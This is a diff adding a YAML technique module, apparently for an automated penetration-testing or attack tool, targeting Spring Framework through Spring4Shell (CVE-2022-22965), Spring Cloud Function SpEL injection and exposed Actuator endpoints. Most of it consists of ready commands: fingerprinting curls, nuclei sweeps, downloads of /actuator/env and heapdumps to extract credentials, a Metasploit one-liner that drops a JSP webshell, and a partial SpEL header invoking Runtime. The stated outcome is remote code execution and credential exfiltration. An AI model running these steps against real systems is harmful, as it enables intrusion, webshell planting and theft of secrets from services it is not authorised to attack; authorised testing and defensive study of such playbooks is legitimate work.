@@ -1,0 +1,45 @@
+id: tech_spring
+title: "Spring Framework — Spring4Shell (CVE-2022-22965) + SpEL injection + Actuator RCE"
+phase: exploit
+mitre: ["T1190"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["spring", "spring boot", "spring-mvc", "x-application-context", "/actuator"]
+  cves:     ["CVE-2022-22965", "CVE-2022-22963", "CVE-2018-1273", "CVE-2017-8046", "CVE-2024-22243"]
+keywords: ["spring", "spring4shell", "spring shell", "spel", "actuator", "spring boot exposed"]
+preconditions:
+  - "Spring footprint (Whitelabel Error Page, X-Application-Context header, /actuator)"
+steps:
+  - tool: curl
+    cmd:  "curl -s {base_url}/ -I | grep -i x-application-context"
+    why:  "Spring boot fingerprint via X-Application-Context header"
+  - tool: curl
+    cmd:  "curl -s {base_url}/error 2>&1 | head -10"
+    why:  "Whitelabel Error Page = default Spring Boot — confirms framework"
+  - tool: nuclei
+    cmd:  "nuclei -tags springboot,spring -u {base_url}"
+    why:  "Sweep — Spring4Shell + actuator exposures + SpEL CVEs"
+  - tool: curl
+    cmd:  "curl -s '{base_url}/actuator/health'; curl -s '{base_url}/actuator/env'; curl -s '{base_url}/actuator/heapdump' -o heap.bin"
+    why:  "Actuator exposure — /env leaks creds in plaintext; heapdump → Eclipse MAT for cred extraction"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/spring_framework_rce_spring4shell; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "Automated CVE-2022-22965 — drops JSP webshell via classLoader.resources.context.parent.pipeline manipulation (JDK9+ + Spring MVC + Tomcat)"
+  - tool: nuclei
+    cmd:  "nuclei -t http/cves/2022/CVE-2022-22965.yaml -u {base_url}"
+    why:  "Detection-only Spring4Shell verification"
+  - tool: curl
+    cmd:  "curl -sk -X POST '{base_url}/functionRouter' -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime() ' -d test"
+    why:  "CVE-2022-22963 detection — Spring Cloud Function SpEL header (full payload omitted; PoC widely available)"
+  - tool: curl
+    cmd:  "curl -s '{base_url}/actuator/jolokia/list'"
+    why:  "Jolokia + Actuator → JNDI / JMX bridge when both exposed"
+expected_outcome: "Java RCE as application user; cred / config exfil via Actuator endpoints"
+fallbacks:
+  - "Heapdump (~50MB) often contains DB creds, JWT secrets, env vars — analyze with Eclipse MAT or jhat"
+  - "/actuator/refresh + /actuator/env on Spring Cloud → property override → RCE chain"
+  - "Spring Boot DevTools enabled in prod → restart endpoint + classloader access"
+references:
+  - "https://spring.io/security"
+  - "https://github.com/criss-py/CVE-2022-22965"
